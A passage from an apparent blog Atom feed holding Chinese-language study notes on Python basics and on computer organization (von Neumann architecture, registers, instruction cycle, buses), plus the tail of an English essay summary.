      &lt;p&gt;In my twenties, I had no idea what would matter long term. I’m a smart person, but I didn’t think much about my future. I lived moment to moment, without much thought or planning. Instead, I put my energy into what I thought mattered at the time. Getting good grades, dating, friends, going out to bars, and my appearance were top of the list.&lt;/p&gt;
    
    </summary>
    
      <category term="英语" scheme="https://marnm.github.io/categories/%E8%8B%B1%E8%AF%AD/"/>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>Python学习笔记</title>
    <link href="https://marnm.github.io//posts/297a89d9/"/>
    <id>https://marnm.github.io//posts/297a89d9/</id>
    <published>2020-04-09T13:47:40.000Z</published>
    <updated>2022-05-26T13:39:52.960Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x5B89;&#x88C5;"><a href="#&#x5B89;&#x88C5;" class="headerlink" title="&#x5B89;&#x88C5;"></a>&#x5B89;&#x88C5;</h3><p>&#x76F4;&#x63A5;&#x53BB;<a href="https://www.python.org/downloads/" target="_blank" rel="noopener">&#x5B98;&#x7F51;</a>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4ECB;&#x7ECD;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x4E86;&#x3002;<br><a id="more"></a></p><h3 id="&#x63A8;&#x8350;&#x4E66;&#x5355;"><a href="#&#x63A8;&#x8350;&#x4E66;&#x5355;" class="headerlink" title="&#x63A8;&#x8350;&#x4E66;&#x5355;"></a>&#x63A8;&#x8350;&#x4E66;&#x5355;</h3><p>&#x300A;&#x7B80;&#x660E;Python&#x6559;&#x7A0B;&#x300B;<a href="https://python.swaroopch.com/" target="_blank" rel="noopener">https://python.swaroopch.com/</a></p><p>Python&#x7F16;&#x7801;&#x89C4;&#x8303;&#xFF08;&#x5B98;&#x65B9;&#xFF09;<a href="https://peps.python.org/pep-0008/" target="_blank" rel="noopener">https://peps.python.org/pep-0008/</a></p><p>&#x300A;Python&#x6838;&#x5FC3;&#x7F16;&#x7A0B;&#x300B;[&#x7F8E;] Wesley Chun</p><p>&#x300A;Python&#x6A21;&#x5757;&#x8BE6;&#x89E3;&#x300B;<a href="https://code.google.com/archive/p/pymotwcn/" target="_blank" rel="noopener">Google Code Archive - Long-term storage for Google Code Project Hosting.</a></p><h3 id="&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;"><a href="#&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;" class="headerlink" title="&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;"></a>&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;</h3><p>Python&#x80FD;&#x505A;&#x7684;&#x4E8B;&#x592A;&#x591A;&#x4E86;&#xFF0C;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x70ED;&#x95E8;&#x7684;&#x9886;&#x57DF;</p><ul><li style="list-style: none"><input type="checkbox"> &#x722C;&#x866B;</li><li style="list-style: none"><input type="checkbox"> &#x5927;&#x6570;&#x636E;&#x5206;&#x6790;</li><li style="list-style: none"><input type="checkbox"> &#x81EA;&#x52A8;&#x5316;&#x6D4B;&#x8BD5;</li><li style="list-style: none"><input type="checkbox"> &#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;</li><li style="list-style: none"><input type="checkbox"> &#x4EBA;&#x5DE5;&#x667A;&#x80FD;</li><li style="list-style: none"><input type="checkbox"> &#x6DF1;&#x5EA6;&#x5B66;&#x4E60;</li><li style="list-style: none"><input type="checkbox"> &#x673A;&#x5668;&#x5B66;&#x4E60;</li><li style="list-style: none"><input type="checkbox"> &#x56FE;&#x50CF;&#x5904;&#x7406;</li><li style="list-style: none"><input type="checkbox"> &#x56FE;&#x50CF;&#x8BC6;&#x522B;</li><li style="list-style: none"><input type="checkbox"> &#x81EA;&#x52A8;&#x5316;&#x529E;&#x516C;</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;直接去&lt;a href=&quot;https://www.python.org/downloads/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网&lt;/a&gt;下载安装就行了，这里就介绍安装步骤了。&lt;br&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://marnm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理</title>
    <link href="https://marnm.github.io//posts/8d4b7ae1/"/>
    <id>https://marnm.github.io//posts/8d4b7ae1/</id>
    <published>2020-02-14T12:52:36.000Z</published>
    <updated>2022-05-27T01:37:36.444Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2.14&#xFF0C;&#x53BB;**&#x7684;&#x60C5;&#x4EBA;&#x8282;&#xFF0C;&#x8FD8;&#x662F;&#x7535;&#x8111;&#x597D;&#x73A9;</p><p>&#x6211;&#x5410;&#x4E86;&#xFF0C;&#x7EC4;&#x6210;&#x539F;&#x7406;&#x771F;&#x662F;&#x5927;&#x5B66;&#x6700;&#x75DB;&#x82E6;&#x7684;&#x8BFE;&#x7A0B;&#x4E4B;&#x4E00;&#xFF0C;&#x592A;&#x96BE;&#x4E86;o(&#x2565;&#xFE4F;&#x2565;)o</p></blockquote><p>&#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210;</p><p>&#x4E00;  &#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x6982;&#x8BBA;<br><a id="more"></a><br>&#x786C;&#x4EF6;&#xFF1A;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;&#x5982;&#x4E3B;&#x673A;&#xFF0C;&#x5916;&#x8BBE;&#x7B49;</p><p>&#x8F6F;&#x4EF6;&#xFF1A;&#x5177;&#x6709;&#x5404;&#x7C7B;&#x7279;&#x6B8A;&#x529F;&#x80FD;&#x7684;&#x4FE1;&#x606F;&#xFF08;&#x7A0B;&#x5E8F;&#xFF09;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x8F6F;&#x4EF6;&#x7C7B;&#x578B;</th><th>&#x5B9A;&#x4E49;</th><th>&#x4E3E;&#x4F8B;</th></tr></thead><tbody><tr><td>&#x7CFB;&#x7EDF;&#x8F6F;&#x4EF6;</td><td>&#x7528;&#x6765;&#x7BA1;&#x7406;&#x6574;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;</td><td>&#x6807;&#x51C6;&#x7A0B;&#x5E8F;&#x5E93;&#xFF0C;&#x8BED;&#x8A00;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x7F51;&#x7EDC;&#x8F6F;&#x4EF6;</td></tr><tr><td>&#x5E94;&#x7528;&#x8F6F;&#x4EF6;</td><td>&#x6309;&#x4EFB;&#x52A1;&#x9700;&#x8981;&#x7F16;&#x5236;&#x6210;&#x7684;&#x5404;&#x79CD;&#x7A0B;&#x5E8F;</td><td>&#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x7A0B;&#x5E8F;&#xFF0C;&#x6570;&#x636E;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x8FC7;&#x7A0B;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#xFF0C;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x7A0B;&#x5E8F;</td></tr></tbody></table><p>&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x5C42;&#x6B21;&#x7ED3;&#x6784;</p><p>&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x533A;&#x522B;</th><th>&#x5B9A;&#x4E49;</th></tr></thead><tbody><tr><td>&#x8BA1;&#x7B97;&#x673A;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;</td><td>&#x6709;&#x65E0;&#x4E58;&#x6CD5;&#x6307;&#x4EE4;</td><td>&#x7A0B;&#x5E8F;&#x5458;&#x89C1;&#x5230;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x5373;&#x6982;&#x5FF5;&#x6027;&#x7684;&#x7ED3;&#x6784;&#x548C;&#x529F;&#x80FD;&#x7279;&#x6027;&#xFF08;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5BFB;&#x5740;&#x6280;&#x672F;&#xFF0C;I/O&#x673A;&#x7406;&#xFF09;</td></tr><tr><td>&#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210;</td><td>&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x4E58;&#x6CD5;&#x6307;&#x4EE4;</td><td>&#x5B9E;&#x73B0;&#x8BA1;&#x7B97;&#x673A;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;&#x6240;&#x4F53;&#x73B0;&#x7684;&#x5C5E;&#x6027;&#xFF08;&#x5177;&#x4F53;&#x6307;&#x4EE4;&#x7684;&#x5B9E;&#x73B0;&#xFF09;</td></tr></tbody></table><p>&#x51AF;.&#x8BFA;&#x4F9D;&#x66FC;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x7279;&#x70B9;</p><ol><li>&#x8BA1;&#x7B97;&#x673A;&#x7531;&#x8FD0;&#x7B97;&#x5668;&#xFF0C;&#x5B58;&#x50A8;&#x5668;&#xFF0C;&#x63A7;&#x5236;&#x5668;&#xFF0C;&#x8F93;&#x5165;&#x8BBE;&#x5907;&#x548C;&#x8F93;&#x51FA;&#x8BBE;&#x5907;&#x4E94;&#x5927;&#x90E8;&#x5206;&#x7EC4;&#x6210;</li><li>&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x4EE5;&#x540C;&#x7B49;&#x5730;&#x4F4D;&#x5B58;&#x653E;&#x4E0E;&#x5B58;&#x50A8;&#x5668;&#x5185;&#xFF0C;&#x5E76;&#x53EF;&#x6309;&#x5730;&#x5740;&#x5BFB;&#x8BBF;</li><li>&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x8868;&#x793A;</li><li>&#x6307;&#x4EE4;&#x7531;&#x64CD;&#x4F5C;&#x7801;&#x548C;&#x5730;&#x5740;&#x7801;&#x7EC4;&#x6210;</li><li>&#x5B58;&#x50A8;&#x7A0B;&#x5E8F;</li><li>&#x4EE5;&#x8FD0;&#x7B97;&#x5668;&#x4E3A;&#x4E2D;&#x5FC3;</li></ol><p>&#x51AF;.&#x8BFA;&#x4F9D;&#x66FC;&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x6846;&#x56FE;</p><p>&#x73B0;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x6846;&#x56FE;</p><p>&#x8BBE;&#x67D0;&#x673A;&#x7684;&#x6307;&#x4EE4;&#x5B57;&#x957F;&#x4E3A;16&#x4F4D;&#xFF0C;&#x5176;&#x4E2D;&#x64CD;&#x4F5C;&#x7801;&#x5360;6&#x4F4D;&#xFF0C;&#x5730;&#x5740;&#x7801;&#x5360;10&#x4F4D;&#x3002;</p><table><thead><tr><th>&#x64CD;&#x4F5C;&#x7801;</th><th>&#x64CD;&#x4F5C;&#x6027;&#x8D28;</th><th>&#x5177;&#x4F53;&#x5185;&#x5BB9;</th></tr></thead><tbody><tr><td>000001</td><td>&#x53D6;&#x6570;</td><td>&#x5C06;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x53D6;&#x5230;&#x8FD0;&#x7B97;&#x5668;&#x7684;&#x7D2F;&#x52A0;&#x5668;ACC&#x4E2D;</td></tr><tr><td>000010</td><td>&#x5B58;&#x6570;</td><td>&#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x5B58;&#x81F3;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;</td></tr><tr><td>000011</td><td>&#x52A0;</td><td>&#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x4E0E;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x6570;&#x76F8;&#x52A0;&#xFF0C;&#x7ED3;&#x679C;&#x5B58;&#x4E8E;ACC&#x4E2D;</td></tr><tr><td>000100</td><td>&#x4E58;</td><td>&#x5C06;ACC&#x4E2D;&#x7684;&#x6570;&#x4E0E;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x7684;&#x6570;&#x76F8;&#x4E58;&#xFF0C;&#x7ED3;&#x679C;&#x5B58;&#x4E8E;ACC&#x4E2D;</td></tr><tr><td>000101</td><td>&#x6253;&#x5370;</td><td>&#x5C06;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x6307;&#x793A;&#x7684;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x64CD;&#x4F5C;&#x6570;&#x6253;&#x5370;&#x8F93;&#x51FA;</td></tr></tbody></table><p>&#x5B58;&#x50A8;&#x5668;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x7EC4;&#x6210;</th><th>&#x89E3;&#x91CA;</th></tr></thead><tbody><tr><td>&#x5B58;&#x50A8;&#x5355;&#x5143;</td><td>&#x5B58;&#x653E;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;</td></tr><tr><td>&#x5B58;&#x50A8;&#x5B57;</td><td>&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x7EC4;&#x5408;</td></tr><tr><td>&#x5B58;&#x50A8;&#x5B57;&#x957F;</td><td>&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2D;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x4F4D;&#x6570;&#x6BCF;&#x4E2A;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x8D4B;&#x4E88;&#x4E00;&#x4E2A;&#x5730;&#x5740;&#x53F7;</td></tr><tr><td>MAR</td><td>&#x5B58;&#x50A8;&#x5668;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x53CD;&#x6620;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x7684;&#x4E2A;&#x6570; 2**n</td></tr><tr><td>MDR</td><td>&#x5B58;&#x50A8;&#x5668;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x53CD;&#x6620;&#x5B58;&#x50A8;&#x5B57;&#x957F; n</td></tr></tbody></table><p>&#x8FD0;&#x7B97;&#x5668;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8FD0;&#x7B97;</th><th>&#x52A0;&#x6CD5;</th><th>&#x51CF;&#x6CD5;</th><th>&#x4E58;&#x6CD5;</th><th>&#x9664;&#x6CD5;</th></tr></thead><tbody><tr><td>ACC</td><td>&#x88AB;&#x52A0;&#x6570;&#x53CA;&#x548C;</td><td>&#x88AB;&#x51CF;&#x6570;&#x53CA;&#x5DEE;</td><td>&#x4E58;&#x79EF;&#x9AD8;&#x4F4D;</td><td>&#x88AB;&#x9664;&#x6570;&#x53CA;&#x4F59;&#x6570;</td></tr><tr><td>MQ</td><td></td><td></td><td>&#x4E58;&#x6570;&#x53CA;&#x4E58;&#x79EF;&#x4F4E;&#x4F4D;</td><td>&#x5546;</td></tr><tr><td>X</td><td>&#x52A0;&#x6570;</td><td>&#x51CF;&#x6570;</td><td>&#x88AB;&#x4E58;&#x6570;</td><td>&#x9664;&#x6570;</td></tr></tbody></table><p>&#x63A7;&#x5236;&#x5668;&#x7684;&#x57FA;&#x672C;&#x7EC4;&#x6210;</p><p>| &#x7B80;&#x79F0; | &#x610F;&#x4E49; | &#x4F5C;&#x7528; | &#x89E3;&#x91CA; |<br>| PC | &#x53D6;&#x6307;&#x4EE4; | &#x53D6;&#x6307;&#xFF0C;&#x8BBF;&#x5B58; | &#x5B58;&#x653E;&#x5F53;&#x524D;&#x6B32;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x7684;&#x5730;&#x5740;&#xFF0C;&#x5177;&#x6709;&#x8BA1;&#x6570;&#x529F;&#x80FD;(PC)+1-&gt;pc |<br>| IR | &#x5206;&#x6790;&#x6307;&#x4EE4; | &#x53D6;&#x6307;&#xFF0C;&#x8BBF;&#x5B58; | &#x5B58;&#x653E;&#x5F53;&#x524D;&#x6B32;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4; |<br>| CU | &#x6267;&#x884C;&#x6307;&#x4EE4; | &#x6267;&#x884C;&#xFF0C;&#x8BBF;&#x5B58; | &#x63A7;&#x5236;&#x5355;&#x5143; |</p><p>&#x4EE5;&#x53D6;&#x6570;&#x6307;&#x4EE4;&#x4E3A;&#x4F8B;</p><p>&#x7A0B;&#x5E8F;&#x9996;&#x5730;&#x5740;PC<br>&#x53D6;&#x6307;&#x4EE4;&#xFF1A;PC-&gt;MAR-&gt;&#x5B58;&#x50A8;&#x4F53;M-MDR-&gt;IR<br>&#x5206;&#x6790;&#x6307;&#x4EE4;&#xFF1A;IR-&gt;CU<br>&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF1A;IR-&gt;MAR-&gt;M-&gt;MDR-&gt;ACC</p><p>&#x8BA1;&#x7B97;&#x673A;&#x786C;&#x4EF6;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#x6307;&#x6807;</p><p>&#x673A;&#x5668;&#x5B57;&#x957F;&#xFF1A;CPU&#x4E00;&#x6B21;&#x80FD;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x4F4D;&#x6570;&#xFF0C;&#x4E0E;CPU&#x4E2D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x4F4D;&#x6570;&#x6709;&#x5173;&#x3002;</p><p>&#x8FD0;&#x7B97;&#x901F;&#x5EA6;&#xFF1A;&#x4E3B;&#x9891;&#xFF0C;&#x5409;&#x666E;&#x68EE;&#x6CD5;(&#x6BCF;&#x6761;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x4ED6;&#x4EEC;&#x5728;&#x5168;&#x90E8;&#x64CD;&#x4F5C;&#x4E2D;&#x6240;&#x5360;&#x7684;&#x767E;&#x5206;&#x6BD4;TM=&#x2211;ni=1fitiTM=&#x2211;i=1nfiti)&#xFF0C;MIPS(&#x767E;&#x4E07;&#x6761;&#x6307;&#x4EE4;&#x6BCF;&#x79D2;),CPI(&#x6267;&#x884C;&#x4E00;&#x6761;&#x6307;&#x4EE4;&#x6240;&#x9700;&#x65F6;&#x949F;&#x5468;&#x671F;&#x6570;)&#xFF0C;FLOPS(&#x6BCF;&#x79D2;&#x6D6E;&#x70B9;&#x8FD0;&#x7B97;&#x6B21;&#x6570;)</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;(&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x4FE1;&#x606F;&#x7684;&#x603B;&#x4F4D;&#x6570;)</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x7EC4;&#x6210;</th></tr></thead><tbody><tr><td>&#x4E3B;&#x5B58;&#x5BB9;&#x91CF;</td><td>&#x5B58;&#x50A8;&#x5355;&#x5143;&#xD7;&#x5B57;&#x8282;&#x6570;</td></tr><tr><td>&#x4E3B;&#x5B58;&#x5BB9;&#x91CF;</td><td>&#x5B57;&#x8282;&#x6570;</td></tr><tr><td>&#x8F85;&#x5B58;&#x5BB9;&#x91CF;</td><td>&#x5B57;&#x8282;&#x6570;</td></tr></tbody></table><p>&#x6307;&#x4EE4;&#x548C;&#x6570;&#x636E;&#x90FD;&#x5B58;&#x4E8E;&#x5B58;&#x50A8;&#x5668;&#x4E2D;&#xFF0C;&#x8BA1;&#x7B97;&#x673A;&#x5982;&#x4F55;&#x533A;&#x5206;&#x5B83;&#x4EEC;&#xFF1F;<br>1.&#x901A;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x6BB5;&#xFF0C;&#x5728;&#x53D6;&#x6307;&#x4EE4;&#x9636;&#x6BB5;&#x53D6;&#x51FA;&#x7684;&#x4E3A;&#x6307;&#x4EE4;&#xFF0C;&#x5728;&#x6267;&#x884C;&#x6307;&#x4EE4;&#x9636;&#x6BB5;&#x53D6;&#x51FA;&#x4E3A;&#x6570;&#x636E;<br>2.&#x901A;&#x8FC7;&#x5730;&#x5740;&#x6E90;&#xFF1A;&#x7531;PC&#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x5730;&#x5740;&#x7684;&#x53D6;&#x51FA;&#x7684;&#x662F;&#x6307;&#x4EE4;&#xFF0C;&#x7531;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x7801;&#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x5730;&#x5740;&#x53D6;&#x51FA;&#x7684;&#x662F;&#x64CD;&#x4F5C;&#x6570;&#x3002;</p><p>&#x4E8C;  &#x8BA1;&#x7B97;&#x673A;&#x7684;&#x53D1;&#x5C55;&#x53CA;&#x5E94;&#x7528;</p><p>Moore&#xFF08;&#x6469;&#x5C14;&#xFF09;&#x5B9A;&#x5F8B;&#xFF1A;&#x5FAE;&#x82AF;&#x4E0A;&#x96C6;&#x6210;&#x7684;&#x6676;&#x4F53;&#x7BA1;&#x6570;&#x76EE;&#x6BCF;&#x4E09;&#x5E74;&#x7FFB;&#x4E24;&#x756A;</p><p>&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5E94;&#x7528;</p><p>&#x4E00;&#x3001;&#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x548C;&#x6570;&#x636E;&#x5904;&#x7406;</p><p>&#x4E8C;&#x3001;&#x5DE5;&#x4E1A;&#x63A7;&#x5236;&#x548C;&#x5B9E;&#x65F6;&#x63A7;&#x5236;</p><p>&#x4E09;&#x3001;&#x7F51;&#x7EDC;&#x6280;&#x672F;</p><ol><li><p>&#x7535;&#x5B50;&#x5546;&#x52A1;</p></li><li><p>&#x7F51;&#x7EDC;&#x6559;&#x80B2;</p></li><li><p>&#x654F;&#x6377;&#x5236;&#x9020;</p></li></ol><p>&#x56DB;&#x3001;&#x865A;&#x62DF;&#x73B0;&#x5B9E;</p><p>&#x4E94;&#x3001;&#x529E;&#x516C;&#x81EA;&#x52A8;&#x5316;&#x548C;&#x7BA1;&#x7406;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;</p><p>&#x516D;&#x3001;CAD/CAM/CIMS</p><p>&#x4E03;&#x3001;&#x591A;&#x5A92;&#x4F53;&#x6280;&#x672F;</p><p>&#x516B;&#x3001;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;</p><p>&#x82AF;&#x7247;&#x96C6;&#x6210;&#x5EA6;&#x7684;&#x63D0;&#x9AD8;&#x53D7;&#x4EE5;&#x4E0B;&#x4E09;&#x65B9;&#x9762;&#x7684;&#x9650;&#x5236;</p><p>&#x82AF;&#x7247;&#x96C6;&#x6210;&#x5EA6;&#x53D7;&#x7269;&#x7406;&#x6781;&#x9650;&#x7684;&#x5236;&#x7EA6;</p><p>&#x6309;&#x51E0;&#x4F55;&#x7EA7;&#x6570;&#x9012;&#x589E;&#x7684;&#x5236;&#x4F5C;&#x6210;&#x672C;</p><p>&#x82AF;&#x7247;&#x7684;&#x529F;&#x8017;&#x3001;&#x6563;&#x70ED;&#x3001;&#x7EBF;&#x5EF6;&#x8FDF;</p><table><thead><tr><th>&#x8BA1;&#x7B97;&#x673A;</th><th>&#x4EE3;&#x66FF;&#x90E8;&#x5206;</th></tr></thead><tbody><tr><td>&#x5149;&#x8BA1;&#x7B97;&#x673A;</td><td>&#x5229;&#x7528;&#x5149;&#x5B50;&#x53D6;&#x4EE3;&#x7535;&#x5B50;&#x8FDB;&#x884C;&#x8FD0;&#x7B97;&#x548C;&#x5B58;&#x50A8;</td></tr><tr><td>DNA&#x751F;&#x7269;&#x8BA1;&#x7B97;&#x673A;</td><td>&#x901A;&#x8FC7;&#x63A7;&#x5236;DNA&#x5206;&#x5B50;&#x95F4;&#x7684;&#x751F;&#x5316;&#x53CD;&#x5E94;</td></tr><tr><td>&#x91CF;&#x5B50;&#x8BA1;&#x7B97;&#x673A;</td><td>&#x5229;&#x7528;&#x539F;&#x5B50;&#x6240;&#x5177;&#x6709;&#x7684;&#x91CF;&#x5B50;&#x7279;&#x6027;</td></tr></tbody></table><p>&#x4E09;  &#x7CFB;&#x7EDF;&#x603B;&#x7EBF;</p><p>&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x4E94;&#x5927;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x7684;&#x4E92;&#x8FDE;&#x7684;&#x65B9;&#x5F0F;&#x6709;&#x4E24;&#x79CD;</p><ol><li>&#x5206;&#x6563;&#x8FDE;&#x63A5;&#xFF1A;&#x5404;&#x90E8;&#x4EF6;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;&#x5355;&#x72EC;&#x7684;&#x8FDE;&#x7EBF;</li><li>&#x603B;&#x7EBF;&#x8FDE;&#x63A5;&#xFF1A;&#x5C06;&#x5404;&#x90E8;&#x4EF6;&#x8FDE;&#x5230;&#x4E00;&#x7EC4;&#x516C;&#x5171;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;&#x4E0A;</li></ol><p>&#x603B;&#x7EBF;&#xFF1A;&#x8FDE;&#x63A5;&#x5404;&#x4E2A;&#x90E8;&#x4EF6;&#x7684;&#x4FE1;&#x606F;&#x4F20;&#x8F93;&#x7EBF;&#xFF0C;&#x662F;&#x5404;&#x4E2A;&#x90E8;&#x4EF6;&#x5171;&#x4EAB;&#x7684;&#x4F20;&#x8F93;&#x4ECB;&#x8D28;</p><p>&#x603B;&#x7EBF;&#x4F20;&#x8F93;&#x7279;&#x70B9;&#xFF1A;&#x67D0;&#x4E00;&#x65F6;&#x523B;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x8DEF;&#x4FE1;&#x606F;&#x5728;&#x603B;&#x7EBF;&#x4E0A;&#x4F20;&#x8F93;&#xFF0C;&#x5373;&#x5206;&#x65F6;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x51CF;&#x8F7B;&#x603B;&#x7EBF;&#x8D1F;&#x8F7D;&#xFF0C;&#x603B;&#x7EBF;&#x4E0A;&#x7684;&#x90E8;&#x4EF6;&#x5E94;&#x901A;&#x8FC7;&#x4E09;&#x6001;&#x9A71;&#x52A8;&#x7F13;&#x51B2;&#x7535;&#x8DEF;&#x4E0E;&#x603B;&#x7EBF;&#x76F8;&#x8FDE;</p><p>&#x603B;&#x7EBF;&#x4E0A;&#x4FE1;&#x606F;&#x7684;&#x4F20;&#x8F93;&#xFF1A;</p><p>&#x4E32;&#x884C;&#xFF1A;&#x6BCF;&#x6761;&#x7EBF;&#x53EF;&#x4E00;&#x4F4D;&#x4E00;&#x4F4D;&#x7684;&#x4F20;&#x8F93;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#xFF0C;&#x4E00;&#x4E32;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x53EF;&#x5728;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#x9010;&#x4E00;&#x4F20;&#x8F93;&#x5B8C;&#x6210;</p><p>&#x5E76;&#x884C;&#xFF1A;&#x82E5;&#x5E72;&#x6761;&#x4F20;&#x8F93;&#x7EBF;&#x540C;&#x65F6;&#x4F20;&#x8F93;&#x82E5;&#x5E72;&#x6761;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;</p><p>&#x9762;&#x5411; CPU 